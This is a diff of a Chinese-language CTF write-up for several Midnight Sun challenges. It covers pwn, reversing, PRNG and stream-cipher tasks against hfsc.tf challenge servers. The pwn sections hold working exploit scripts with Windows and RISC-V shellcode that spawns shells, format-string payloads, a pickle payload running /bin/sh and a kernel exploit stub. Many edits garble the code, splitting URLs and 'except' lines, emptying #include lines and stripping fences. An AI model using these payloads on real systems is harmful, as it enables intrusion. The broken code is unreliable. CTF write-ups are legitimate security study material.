@@ -9,7 +9,8 @@ Pwn
 
 pyttemjuk
 
-拿到shell之后，不断输入type c:flag.txt就可以拿到flag了
+拿到shell之后，不断输入type c:
+flag.txt就可以拿到flag了
 
 from pwn import *
 from time import sleep
@@ -422,10 +423,10 @@ SPD D
 #include <stdint.h>
 #include <assert.h>
 #include <signal.h>
-#include <unistd.h>
+#include 
 #include <syscall.h>
-#include <pthread.h>
-#include <poll.h>
+#include 
+#include 
 #include <linux/userfaultfd.h>
 #include <linux/fs.h>
 #include <sys/shm.h>
@@ -778,7 +779,8 @@ switch ( (i + 1) * (v7 % 6) % 6 )
 
 但是有一个地方需要注意的是，虽然有些分支会改成 0x80000000，但是这个数会被拓展为 0xffffffff80000000，在爆破字节的时候，前者是求不出结果的，而后者可以。
 
-mov edx, cs:magic
+mov edx, cs:
+magic
 movsxd rdx, edx
 
 所以最后甚至可以手搓。前几个字节是 midnight{ ，其中，前八个会用来生成一个序列，然后第九个字节就能进行验证了。此后的每一个输入都在验证，因此甚至可以直接手搓。每个字节似乎都能有两个可能，选出其中有意义的密文就可以了。
@@ -787,7 +789,7 @@ movsxd rdx, edx
 
 最后写一个深搜搞定了：
 
-#include <iostream>
+#include 
 #include<vector>
 using namespace std;
 unsigned char ida_chars[] =
@@ -901,11 +903,11 @@ if (isset($_GET['generate_samples'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mt. Random</title>
 </head>
-<body>
+
     <h1>Hiking Guide</h1>
-    <p>This mountain is boring, I'm going to sample alot of seeds!</p>
-    <a href="?generate_samples=1">Get a new sample</a>
-</body>
+    This mountain is boring, I'm going to sample alot of seeds!
+    [Get a new sample](?generate_samples=1)
+
 </html>
 
 大意是将flag编码，然后设置随机种子，接着在设定的范围内产生随机值。
@@ -917,9 +919,11 @@ import requests
 samples = []
 for i in range(100):
     try:
-        res = requests.get("http://mtrandom-1.play.hfsc.tf:51237/?generate_samples=1").json()["samples"]
+        res = requests.get("http://mtrandom-1.play.hfsc.tf:
+51237/?generate_samples=1").json()["samples"]
         samples.append(res)
-    except Exception as e:
+    
+except Exception as e:
         pass
 print(samples)
 
@@ -1043,7 +1047,8 @@ def get_max(array):
             max_difference = difference
             split_index = i
 
-    smaller_array = array[:split_index]
+    smaller_array = array[:
+split_index]
 
     smaller_array_max = max(smaller_array)
     return smaller_array_max
@@ -1152,17 +1157,17 @@ $table = flag_to_numbers($table);
 $samples = [81, 96, 235, 178, 96, 30, 241, 58, 68, 81, 78, 178, 235, 171, 58, 241, 179, 171, 30, 65, 175, 8];
 $c = 0;
 $flag = "";
-echo("[</br>");
+echo("[");
 foreach ($samples as $n) {
     foreach ($table as $t) {
         $generated_sample = non_continuous_sample($min, $max, $gap_start, $gap_end, $seed + $t);
         if ($generated_sample === $n) {
-            echo("$c =>['" . chr($t) . "'],</br>");
+            echo("$c =>['" . chr($t) . "'],");
         }
     }
     $c += 1;
 }
-echo("]</br>");
+echo("]");
 ?>
 
 接下来就是继续爆破了，但是最后某些位置的字符会生成一样的随机结果，好在不多，而且flag是有意义的字符串，所以比较好辨认。
@@ -1235,7 +1240,7 @@ $chars = [
 function generate_combinations($chars, $index = 0, $current = "")
 {
     if ($index >= count($chars)) {
-        echo $current . PHP_EOL . "</br>";
+        echo $current . PHP_EOL . "";
         return;
     }
 
@@ -1367,7 +1372,8 @@ def decrypt_oracle():
             if decompressed_data.decode('utf-8')[i] == FLAG[i]:
                 return jsonify(status=500, message="Error: CTF character at index found: " + str(i))
         return jsonify(status=200, message="Success")
-    except Exception as e:
+    
+except Exception as e:
         return jsonify(status=500, message="Error")
 
 if __name__ == '__main__':
@@ -1412,7 +1418,8 @@ def dancingbits(cs, key, nonce):
         plain.append(m)
     return bytes(plain)
 
-url = 'http://dancingbits-1.play.hfsc.tf:23105'
+url = 'http://dancingbits-1.play.hfsc.tf:
+23105'
 req = requests.get(url + '/encrypted_flag')
 encrypted_flag = req.content
 print(encrypted_flag)
@@ -1446,7 +1453,8 @@ for i in range(1 << tmp):
     tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE1)
     try:
         tmp_flag = zlib.decompress(tmp_compressed_flag)
-    except:
+    
+except:
         continue
     if b'midnight{' in tmp_flag:
         print(tmp_flag)
@@ -1458,7 +1466,8 @@ for i in range(1 << tmp):
     tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE2)
     try:
         tmp_flag = zlib.decompress(tmp_compressed_flag)
-    except:
+    
+except:
         continue
     if b'midnight{' in tmp_flag:
         print(tmp_flag)
@@ -1484,7 +1493,8 @@ session_start();
 
 if(isset($_GET['cmd'])){
     $_GET['cmd'](strval($_GET['path'])); # One argument for babies
-    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)<br>n";
+    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)
+n";
 
     $_SESSION['attempts'] = (isset($_SESSION['attempts']) ? $_SESSION['attempts']+1 : $_SESSION['attempts']=1);
 
@@ -1562,7 +1572,7 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
 r = remote('pyttemjuk-1.play.hfsc.tf', 1337)
-#r = remote('192.168.10.107', 1234)
+    #r = remote('192.168.10.107', 1234)
 pause()
 
 gets_plt = 0x40263C
@@ -1576,12 +1586,12 @@ p1 += p32(bss_addr)
 r.sendlineafter('Enter your name: ', p1)
 
 p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx40x1cx8bx04x08x8bx04x08x8bx58x08x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x49x8bx72x24x01xdex66x8bx0cx4ex8bx72x1cx01xdex8bx14x8ex01xdax89xd6x31xc9x51x68x45x78x65x63x68x41x57x69x6ex89xe1x8dx49x01x51x53xffxd6x87xfax89xc7x31xc9x51x68x72x65x61x64x68x69x74x54x68x68x41x41x45x78x89xe1x8dx49x02x51x53xffxd6x89xc6x31xc9x51x68x65x78x65x20x68x63x6dx64x2ex89xe1x6ax01x51xffxd7x31xc9x51xffxd6'
-#p2 = b'bbbb'
-#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xffx89xdfx31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x54x53xffxd2x83xc4x0cx31xc9x68x65x73x73x42x88x4cx24x03x68x50x72x6fx63x68x45x78x69x74x54x57x31xffx89xc7xffxd6x83xc4x0cx31xc9x51x68x64x6cx6cx41x88x4cx24x03x68x6cx33x32x2ex68x73x68x65x6cx54x31xd2x89xfax89xc7xffxd2x83xc4x0bx31xc9x68x41x42x42x42x88x4cx24x01x68x63x75x74x65x68x6cx45x78x65x68x53x68x65x6cx54x50xffxd6x83xc4x0dx31xc9x68x65x78x65x41x88x4cx24x03x68x63x6dx64x2ex54x59x31xd2x42x52x31xd2x52x52x51x52x52xffxd0xffxd7'
+    #p2 = b'bbbb'
+    #p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xffx89xdfx31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x54x53xffxd2x83xc4x0cx31xc9x68x65x73x73x42x88x4cx24x03x68x50x72x6fx63x68x45x78x69x74x54x57x31xffx89xc7xffxd6x83xc4x0cx31xc9x51x68x64x6cx6cx41x88x4cx24x03x68x6cx33x32x2ex68x73x68x65x6cx54x31xd2x89xfax89xc7xffxd2x83xc4x0bx31xc9x68x41x42x42x42x88x4cx24x01x68x63x75x74x65x68x6cx45x78x65x68x53x68x65x6cx54x50xffxd6x83xc4x0dx31xc9x68x65x78x65x41x88x4cx24x03x68x63x6dx64x2ex54x59x31xd2x42x52x31xd2x52x52x51x52x52xffxd0xffxd7'
 sleep(1)
-#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx48x10x31xdbx8bx59x3cx01xcbx8bx5bx78x01xcbx8bx73x20x01xcex31xd2x42xadx01xc8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx73x1cx01xcex8bx14x96x01xcax89xd6x89xcfx31xdbx68x79x41x41x41x66x89x5cx24x01x68x65x6dx6fx72x68x65x72x6fx4dx68x52x74x6cx5ax54x51xffxd2x83xc4x10x31xc9x89xcaxb2x54x51x83xecx54x8dx0cx24x51x52x51xffxd0x59x31xd2x68x73x41x42x42x66x89x54x24x02x68x6fx63x65x73x68x74x65x50x72x68x43x72x65x61x8dx14x24x51x52x57xffxd6x59x83xc4x10x31xdbx68x65x78x65x41x88x5cx24x03x68x63x6dx64x2ex8dx1cx24x31xd2xb2x44x89x11x8dx51x44x56x31xf6x52x51x56x56x56x56x56x56x53x56xffxd0x5ex83xc4x08x31xdbx68x65x73x73x41x88x5cx24x03x68x50x72x6fx63x68x45x78x69x74x8dx1cx24x53x57xffxd6x31xc9x51xffxd0'
-#p2 = 'x31xc9x64xa1x30x00x00x00x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x52x5ex31xffx53x5fx31xc9x51x68x78x65x63x00x68x57x69x6ex45x89xe1x51x53xffxd2x31xc9x51x68x65x73x73x00x68x50x72x6fx63x68x45x78x69x74x89xe1x51x57x31xffx89xc7xffxd6x31xf6x50x5ex31xc9x51x68x65x78x65x00x68x63x6dx64x2ex89xe1x6ax00x51xffxd7x6ax00xffxd6xffxffxffxffx00x00x00xffxffxffxffx00x00x00'
-#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x89xe1x51x53xffxd2x31xc9x66xb9x6cx6cx51x68x72x74x2ex64x68x6dx73x76x63x89xe1x51xffxd0x31xffx89xc7x31xd2x52x66xbax65x6dx52x68x73x79x73x74x89xe1x51x57x31xd2x89xf2xffxd2x31xc9x66xb9x66x6fx51x68x65x6dx69x6ex68x73x79x73x74x89xe1x51xffxd0x31xc9x66xb9x63x68x51x68x5fx67x65x74x89xe1x51x57x31xd2x89xf2xffxd2xffxd0x31xd2x52x68x65x78x69x74x89xe1x51x57xffxd6xffxd0'
+    #p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx48x10x31xdbx8bx59x3cx01xcbx8bx5bx78x01xcbx8bx73x20x01xcex31xd2x42xadx01xc8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx73x1cx01xcex8bx14x96x01xcax89xd6x89xcfx31xdbx68x79x41x41x41x66x89x5cx24x01x68x65x6dx6fx72x68x65x72x6fx4dx68x52x74x6cx5ax54x51xffxd2x83xc4x10x31xc9x89xcaxb2x54x51x83xecx54x8dx0cx24x51x52x51xffxd0x59x31xd2x68x73x41x42x42x66x89x54x24x02x68x6fx63x65x73x68x74x65x50x72x68x43x72x65x61x8dx14x24x51x52x57xffxd6x59x83xc4x10x31xdbx68x65x78x65x41x88x5cx24x03x68x63x6dx64x2ex8dx1cx24x31xd2xb2x44x89x11x8dx51x44x56x31xf6x52x51x56x56x56x56x56x56x53x56xffxd0x5ex83xc4x08x31xdbx68x65x73x73x41x88x5cx24x03x68x50x72x6fx63x68x45x78x69x74x8dx1cx24x53x57xffxd6x31xc9x51xffxd0'
+    #p2 = 'x31xc9x64xa1x30x00x00x00x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x52x5ex31xffx53x5fx31xc9x51x68x78x65x63x00x68x57x69x6ex45x89xe1x51x53xffxd2x31xc9x51x68x65x73x73x00x68x50x72x6fx63x68x45x78x69x74x89xe1x51x57x31xffx89xc7xffxd6x31xf6x50x5ex31xc9x51x68x65x78x65x00x68x63x6dx64x2ex89xe1x6ax00x51xffxd7x6ax00xffxd6xffxffxffxffx00x00x00xffxffxffxffx00x00x00'
+    #p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x89xe1x51x53xffxd2x31xc9x66xb9x6cx6cx51x68x72x74x2ex64x68x6dx73x76x63x89xe1x51xffxd0x31xffx89xc7x31xd2x52x66xbax65x6dx52x68x73x79x73x74x89xe1x51x57x31xd2x89xf2xffxd2x31xc9x66xb9x66x6fx51x68x65x6dx69x6ex68x73x79x73x74x89xe1x51xffxd0x31xc9x66xb9x63x68x51x68x5fx67x65x74x89xe1x51x57x31xd2x89xf2xffxd2xffxd0x31xd2x52x68x65x78x69x74x89xe1x51x57xffxd6xffxd0'
 r.sendline(p2)
 
 p3 = b'a' * (0x14 + 4)
@@ -1592,24 +1602,14 @@ r.sendlineafter('Enter your name: ', p3)
 sleep(5)
 r.sendline('dir')
 
-#r.sendline('calc')
+    #r.sendline('calc')
 r.interactive()
 # midnight{i_prefer_sun_solaris_doors_over_microsoft_windows}
-```
-
-
-
-```
 cos
 system
 (S'/bin/sh'
 tR.
 #Y29zCnN5c3RlbQooUycvYmluL3NoJwp0Ui4=
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -1641,11 +1641,11 @@ def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
 context(os='windows', arch='i386', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('scaas-1.play.hfsc.tf', 1337)
 elf = ELF('./pwn')
-#libc = ELF('./libc-2.27-x64.so')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
+    #libc = ELF('./libc-2.27-x64.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
 sla(b'> ', b'1')
 rl(b'Here is your SCAAS service: (n')
 text = b''
@@ -1655,11 +1655,6 @@ a = base64.b64decode(text)
 
 with open('./pwn', 'rb+') as f:
     f.write(a)
-```
-
-
-
-```
 for i in range(0xfffffff):
     a = 8511 * i
     if a > 0xffffffff:
@@ -1668,11 +1663,6 @@ for i in range(0xfffffff):
         d = int(c, 16)
         if d % 0x2B27EA == 24486:
             print(i)
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -1704,13 +1694,13 @@ def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
 context(os='linux', arch='i386', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('scaas-1.play.hfsc.tf', 1337)
 elf = ELF('./pwn')
-#libc = ELF('./libc-2.27-x64.so')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
+    #libc = ELF('./libc-2.27-x64.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
 
-#gdb.attach(p, 'b *$rebase(0x1609)')
+    #gdb.attach(p, 'b *$rebase(0x1609)')
 
 sla(b'> ', b'2')
 sla(b'0: ', str(0x916D00))
@@ -1733,12 +1723,7 @@ sla(b'4: ', str(0))
 
 sla(b'bytes): ', 'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA')
 inter()
-#pause()
-```
-
-
-
-```
+    #pause()
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -1770,20 +1755,15 @@ def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
 context(os='linux', arch='amd64'', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('scaas-1.play.hfsc.tf', 1337)
 elf = ELF('./pwn')
-#libc = ELF('./libc-2.27-x64.so')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
-#gdb.attach(p, 'b *$rebase(0x15ac)')
+    #libc = ELF('./libc-2.27-x64.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
+    #gdb.attach(p, 'b *$rebase(0x15ac)')
 sa(b'c0de: ', asm(shellcraft.open('flag') + shellcraft.read(3, 'rsp', 0x30) + shellcraft.write(1, 'rsp', 0x30)))
 pr()
-#pause()
-```
-
-
-
-```
+    #pause()
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -1815,11 +1795,11 @@ def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
 context(os='linux', arch='i386', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p = remote('spdb-1.play.hfsc.tf', 40002)
 elf = ELF('./pwn')
-#libc = ELF('./libc-2.27-x64.so')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
+    #libc = ELF('./libc-2.27-x64.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
 
 #
 sla(b'guess: ', b'%1$p%3$p')
@@ -1860,16 +1840,11 @@ payload = b'%' + str((shell >> 24) & 0xff).encode() + b'c%34$hn'
 sla(b'guess: ', payload)
 
 inter()
-#gdb.attach(p, 'b *$rebase(0x1369)')
+    #gdb.attach(p, 'b *$rebase(0x1369)')
 print(' stack -> ', hex(stack))
 print(' ret -> ', hex(ret))
 print(' pro_base -> ', hex(pro_base))
-#pause()
-```
-
-
-
-```
+    #pause()
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -1901,45 +1876,40 @@ def get_sb():
     return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process(['qemu-riscv64', './pwn'])
+    #p = process(['qemu-riscv64', './pwn'])
 p = remote('spdc-1.play.hfsc.tf', 40003)
 elf = ELF('./pwn')
-#libc = ELF('./libc-2.27-x64.so')
-#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
+    #libc = ELF('./libc-2.27-x64.so')
+    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
 
 shellcode = b"x01x11x06xecx22xe8x13x04x21x02xb7x67x69x6ex93x87xf7x22x23x30xf4xfexb7x77x68x10x33x48x08x01x05x08x72x08xb3x87x07x41x93x87xf7x32x23x32xf4xfex93x07x04xfex01x46x81x45x3ex85x93x08xd0x0dx73x00x00x00"
 
 sla(b'c0de: ', shellcode)
 
 inter()
-```
-
-
-
-```
-#include <stdio.h>
-#include <fcntl.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <assert.h>
-#include <signal.h>
-#include <unistd.h>
-#include <syscall.h>
-#include <pthread.h>
-#include <poll.h>
-#include <linux/userfaultfd.h>
-#include <linux/fs.h>
-#include <sys/shm.h>
-#include <sys/msg.h>
-#include <sys/ipc.h>
-#include <sys/ioctl.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/mman.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#define ut uint64_t
+    #include <stdio.h>
+    #include <fcntl.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <stdint.h>
+    #include <assert.h>
+    #include <signal.h>
+    #include 
+    #include <syscall.h>
+    #include 
+    #include 
+    #include <linux/userfaultfd.h>
+    #include <linux/fs.h>
+    #include <sys/shm.h>
+    #include <sys/msg.h>
+    #include <sys/ipc.h>
+    #include <sys/ioctl.h>
+    #include <sys/types.h>
+    #include <sys/stat.h>
+    #include <sys/mman.h>
+    #include <sys/socket.h>
+    #include <sys/syscall.h>
+    #define ut uint64_t
 
 void backdoor(){
     system("/bin/sh");
@@ -1982,11 +1952,6 @@ int main(){
     puts("[+]root");
     return 0;
 }
-```
-
-
-
-```
 static main(void)
 {
   auto fp, begin, end, dexbyte;
@@ -1996,11 +1961,6 @@ static main(void)
   for ( dexbyte = begin; dexbyte < end; dexbyte ++ )
       fputc(Byte(dexbyte), fp);
 }
-```
-
-
-
-```
 from z3 import *
 from ctypes import *
 from Crypto.Util.number import long_to_bytes
@@ -2118,12 +2078,7 @@ check4()
 print(long_to_bytes(13160))
 
 #_u3bt4  3hc_  kc
-#u_b34t_th3_crack
-```
-
-
-
-```
+    #u_b34t_th3_crack
 from z3 import *
 
 def rol_4(R2K):
@@ -2158,7 +2113,7 @@ def G3K(K2L):
 s = Solver()
 
 flag =  [BitVec(('flag%s' % i),32) for i in range(24) ]
-#flag =  [Int(('flag%s' % i)) for i in range(24) ]
+    #flag =  [Int(('flag%s' % i)) for i in range(24) ]
 
 p5f=[16,0,8,20,14,12,18,2,22,10,6,4]
 i = 0
@@ -2225,11 +2180,6 @@ m = s.model()
 print m
 for i in range(0,24):
     print (chr(int("%s" % (m[flag[i]]))))
-```
-
-
-
-```
 switch ( (i + 1) * (v7 % 6) % 6 )
     {
       case 0:
@@ -2263,20 +2213,11 @@ switch ( (i + 1) * (v7 % 6) % 6 )
       default:
         break;
     }
-```
-
-
-
-```
-mov edx, cs:magic
+mov edx, cs:
+magic
 movsxd rdx, edx
-```
-
-
-
-```
-#include <iostream>
-#include<vector>
+    #include 
+    #include<vector>
 using namespace std;
 unsigned char ida_chars[] =
 {
@@ -2324,11 +2265,6 @@ void dfs(int depeth,int pre,int num) {
 int main() {
  dfs(9,123, 0);
 }
-```
-
-
-
-```
 <?php
 session_start();
 
@@ -2385,32 +2321,24 @@ if (isset($_GET['generate_samples'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mt. Random</title>
 </head>
-<body>
+
     <h1>Hiking Guide</h1>
-    <p>This mountain is boring, I'm going to sample alot of seeds!</p>
-    <a href="?generate_samples=1">Get a new sample</a>
-</body>
+    This mountain is boring, I'm going to sample alot of seeds!
+    [Get a new sample](?generate_samples=1)
+
 </html>
-```
-
-
-
-```
 import requests
 
 samples = []
 for i in range(100):
     try:
-        res = requests.get("http://mtrandom-1.play.hfsc.tf:51237/?generate_samples=1").json()["samples"]
+        res = requests.get("http://mtrandom-1.play.hfsc.tf:
+51237/?generate_samples=1").json()["samples"]
         samples.append(res)
-    except Exception as e:
+    
+except Exception as e:
         pass
 print(samples)
-```
-
-
-
-```
 from collections import Counter
 
 samples = [[1, 183, 26, 150, 183, 14, 60, 207, 99, 1, 209, 150, 26, 89, 207, 60, 198, 89, 14, 238, 76, 68],
@@ -2525,7 +2453,8 @@ def get_max(array):
             max_difference = difference
             split_index = i
 
-    smaller_array = array[:split_index]
+    smaller_array = array[:
+split_index]
 
     smaller_array_max = max(smaller_array)
     return smaller_array_max
@@ -2543,11 +2472,6 @@ for item, count in counter.items():
         most_common_max = item
 
 print(most_common_max)
-```
-
-
-
-```
 <?php
 session_start();
 
@@ -2599,11 +2523,6 @@ for ($gap_end = 99; $gap_end < 256; $gap_end++) {
     }
 }
 ?>
-```
-
-
-
-```
 <?php
 function non_continuous_sample($min, $max, $gap_start, $gap_end, $seed)
 {
@@ -2634,23 +2553,18 @@ $table = flag_to_numbers($table);
 $samples = [81, 96, 235, 178, 96, 30, 241, 58, 68, 81, 78, 178, 235, 171, 58, 241, 179, 171, 30, 65, 175, 8];
 $c = 0;
 $flag = "";
-echo("[</br>");
+echo("[");
 foreach ($samples as $n) {
     foreach ($table as $t) {
         $generated_sample = non_continuous_sample($min, $max, $gap_start, $gap_end, $seed + $t);
         if ($generated_sample === $n) {
-            echo("$c =>['" . chr($t) . "'],</br>");
+            echo("$c =>['" . chr($t) . "'],");
         }
     }
     $c += 1;
 }
-echo("]</br>");
+echo("]");
 ?>
-```
-
-
-
-```
 [
 0 =>['f'],
 0 =>['m'],
@@ -2684,11 +2598,6 @@ echo("]</br>");
 21 =>['j'],
 21 =>['}'],
 ]
-```
-
-
-
-```
 <?php
 
 $chars = [
@@ -2719,7 +2628,7 @@ $chars = [
 function generate_combinations($chars, $index = 0, $current = "")
 {
     if ($index >= count($chars)) {
-        echo $current . PHP_EOL . "</br>";
+        echo $current . PHP_EOL . "";
         return;
     }
 
@@ -2731,11 +2640,6 @@ function generate_combinations($chars, $index = 0, $current = "")
 generate_combinations($chars);
 
 ?>
-```
-
-
-
-```
 midnight{f1nu_th3_24p}
 midnight{f1nu_th3_2qp}
 midnight{f1nu_th3_2xp}
@@ -2760,17 +2664,7 @@ midnight{m1nd_th3_2xp}
 midnight{m1nd_th3_g4p}
 midnight{m1nd_th3_gqp}
 midnight{m1nd_th3_gxp}
-```
-
-
-
-```
 midnight{s0me0ne_sh0u1d_f4cT_cH3ck_tH3s3_AIs}
-```
-
-
-
-```
 import os
 import zlib
 from flask import Flask, request, jsonify
@@ -2843,16 +2737,12 @@ def decrypt_oracle():
             if decompressed_data.decode('utf-8')[i] == FLAG[i]:
                 return jsonify(status=500, message="Error: CTF character at index found: " + str(i))
         return jsonify(status=200, message="Success")
-    except Exception as e:
+    
+except Exception as e:
         return jsonify(status=500, message="Error")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
-```
-
-
-
-```
 import zlib, requests,sys
 from secrets import token_bytes
 
@@ -2886,7 +2776,8 @@ def dancingbits(cs, key, nonce):
         plain.append(m)
     return bytes(plain)
 
-url = 'http://dancingbits-1.play.hfsc.tf:23105'
+url = 'http://dancingbits-1.play.hfsc.tf:
+23105'
 req = requests.get(url + '/encrypted_flag')
 encrypted_flag = req.content
 print(encrypted_flag)
@@ -2920,7 +2811,8 @@ for i in range(1 << tmp):
     tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE1)
     try:
         tmp_flag = zlib.decompress(tmp_compressed_flag)
-    except:
+    
+except:
         continue
     if b'midnight{' in tmp_flag:
         print(tmp_flag)
@@ -2932,17 +2824,13 @@ for i in range(1 << tmp):
     tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE2)
     try:
         tmp_flag = zlib.decompress(tmp_compressed_flag)
-    except:
+    
+except:
         continue
     if b'midnight{' in tmp_flag:
         print(tmp_flag)
         sys.exit(1)
 # midnight{th3_h0t_n3w_str3am_c1pher}
-```
-
-
-
-```
 <?php
 ini_set("allow_url_fopen", 0);
 ini_set("allow_url_include", 0);
@@ -2950,7 +2838,8 @@ session_start();
 
 if(isset($_GET['cmd'])){
     $_GET['cmd'](strval($_GET['path'])); # One argument for babies
-    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)<br>n";
+    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)
+n";
 
     $_SESSION['attempts'] = (isset($_SESSION['attempts']) ? $_SESSION['attempts']+1 : $_SESSION['attempts']=1);
 
@@ -2967,11 +2856,6 @@ if(isset($_GET['cmd'])){
     }
     die();
 }
-```
-
-
-
-```
 <?php
 session_start();
 $exp = '#!/bin/bash
